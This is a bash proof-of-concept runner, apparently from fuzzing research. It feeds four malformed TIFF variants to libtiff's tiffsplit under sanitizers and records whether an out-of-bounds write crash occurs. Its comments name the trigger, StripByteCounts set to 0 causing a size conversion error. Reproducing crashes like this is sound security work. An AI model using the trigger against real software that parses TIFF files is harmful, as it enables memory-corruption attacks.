#!/bin/bash
# PoC runner for VULN-001: Signed-to-unsigned conversion in _TIFFmemcpy/_TIFFmemset
# CWE-195 -> CWE-787 (Out-of-bounds Write) in tif_unix.c / tif_msdos.c
#
# Trigger: StripByteCounts=0 causes TIFFRawStripSize() to return (tsize_t)-1,
# which is then cast to a huge size_t and passed to _TIFFmalloc/_TIFFmemcpy.

set -uo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_msdos_c"
TIFFSPLIT="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffsplit"
RESULT_FILE="$POC_DIR/vuln_001_result.txt"

cd "$POC_DIR"

# Generate TIFF files if they don't exist
if [ ! -f "$POC_DIR/vuln_001.tif" ]; then
    echo "[*] Generating TIFF PoC files..."
    python3 "$POC_DIR/vuln_001_gen.py"
fi

# Clear previous results
> "$RESULT_FILE"
echo "=== VULN-001 PoC Run: $(date) ===" >> "$RESULT_FILE"
echo "Binary: $TIFFSPLIT" >> "$RESULT_FILE"
echo "" >> "$RESULT_FILE"

CRASHED=0

run_variant() {
    local tif_file="$1"
    local label="$2"
    local asan_log="$POC_DIR/asan_${label}.log"

    echo "--- Testing $label: $tif_file ---" >> "$RESULT_FILE"

    ASAN_OPTIONS="abort_on_error=0:log_path=${asan_log}" \
    UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${asan_log}" \
        timeout 15 "$TIFFSPLIT" "$tif_file" "/tmp/tiffsplit_out_${label}_" \
        >> "$RESULT_FILE" 2>&1 || true

    # Check for ASAN/UBSAN reports
    for f in "${asan_log}".* "${asan_log}"; do
        if [ -f "$f" ] && [ -s "$f" ]; then
            echo "[SANITIZER LOG: $f]" >> "$RESULT_FILE"
            cat "$f" >> "$RESULT_FILE"
            if grep -qE "AddressSanitizer|ERROR:|runtime error:|heap-buffer-overflow|stack-buffer-overflow|use-after-free|SEGV|signal" "$f"; then
                CRASHED=1
            fi
        fi
    done

    # Also check if process exited with signal
    echo "" >> "$RESULT_FILE"
}

# Run all variants
run_variant "$POC_DIR/vuln_001.tif"    "v1_lzw_predictor_bytecounts0"
run_variant "$POC_DIR/vuln_001_v2.tif" "v2_lzw_predictor_bytecounts_max"
run_variant "$POC_DIR/vuln_001_v3.tif" "v3_nocomp_bytecounts0"
run_variant "$POC_DIR/vuln_001_v4.tif" "v4_large_width"

echo "=== Run complete: $(date) ===" >> "$RESULT_FILE"

echo ""
echo "Result file: $RESULT_FILE"
cat "$RESULT_FILE"

# Write status file
STATUS_FILE="$POC_DIR/vuln_001_status.txt"
if [ "$CRASHED" -eq 1 ]; then
    echo "VERIFIED_CRASH" > "$STATUS_FILE"
    echo "" >> "$STATUS_FILE"
    echo "At least one ASAN/UBSAN error was detected." >> "$STATUS_FILE"
    grep -hE "AddressSanitizer|ERROR:|runtime error:|heap-buffer-overflow|stack-buffer-overflow|use-after-free|SEGV" \
        "$POC_DIR"/asan_*.log.* "$POC_DIR"/asan_*.log 2>/dev/null | head -20 >> "$STATUS_FILE" || true
else
    echo "UNVERIFIED" > "$STATUS_FILE"
    echo "" >> "$STATUS_FILE"
    echo "No ASAN/UBSAN crash detected with these inputs." >> "$STATUS_FILE"
    echo "The binary may have rejected the malformed TIFF before reaching the vulnerable code path." >> "$STATUS_FILE"
    echo "" >> "$STATUS_FILE"
    echo "See vuln_001_result.txt for full output." >> "$STATUS_FILE"
fi

echo ""
echo "Status: $(head -1 $STATUS_FILE)"
